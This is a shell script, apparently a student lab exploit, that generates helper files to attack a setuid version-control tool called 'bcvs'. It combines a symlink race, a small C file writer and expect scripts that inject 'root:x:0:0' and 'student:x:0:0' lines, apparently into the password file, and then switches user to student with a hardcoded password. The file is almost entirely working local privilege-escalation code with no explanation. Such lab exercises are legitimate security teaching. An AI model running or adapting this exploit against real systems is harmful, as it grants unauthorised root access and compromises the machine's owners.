#!/bin/sh
touch subprocess.py
cat << EOF >> subprocess.py
import os, errno
src = 'bcvs/block.list'
dst='stuff2.txt.comments'
try:
	os.symlink(src,dst)
except OSError as e:
	if e.errno == errno.EEXIST:
		os.remove(dst)
		os.symlink(src, dst)
	else:
		raise e
EOF

touch run.sh
cat << EOF >> run.sh
#!/bin/sh
sleep 5
python subprocess.py
gcc edit.c -o edit
./edit
EOF

touch firstexp.exp
cat << EOF >> firstexp.exp
#!/usr/bin/expect -f
set timeout -1
spawn ./bcvs ci ../stuff.txt
expect "Please write a SHORT explanation:\r"
sleep 6
send -- "root:x:0:0::/root:/bin/bash\r"
expect eof
spawn ./bcvs ci ../stuff.txt
send -- "student:x:0:0::/root:/bin/bash\r"
expect eof
EOF

touch both.exp
cat << EOF >> both.exp
#!/bin/sh
set timeout -1
spawn ./firstexp.exp
spawn ./run.sh
EOF

touch edit.c
cat << EOF >> edit.c
#include <stdio.h>
int main() {
	char buffer[] = {'x', 'y', 'z'};
	FILE * pFile;
	pFile = fopen("stuff2.txt", "w+");
	fwrite(buffer,sizeof(char), sizeof(buffer), pFile);
	fclose(pFile);	
	return 0;
}
EOF

touch thirdexp.exp
cat << EOF >> thirdexp.exp
#!/usr/bin/expect -f
set timeout -1
spawn su student
expect "Password:"
send -- "security\r"
interact 
expect eof
EOF
chmod +x firstexp.exp
chmod +x run.sh
chmod +x both.exp
chmod +x thirdexp.exp
#./both.exp
./thirdexp.exp
rm firstexp.exp
rm run.sh
rm both.exp

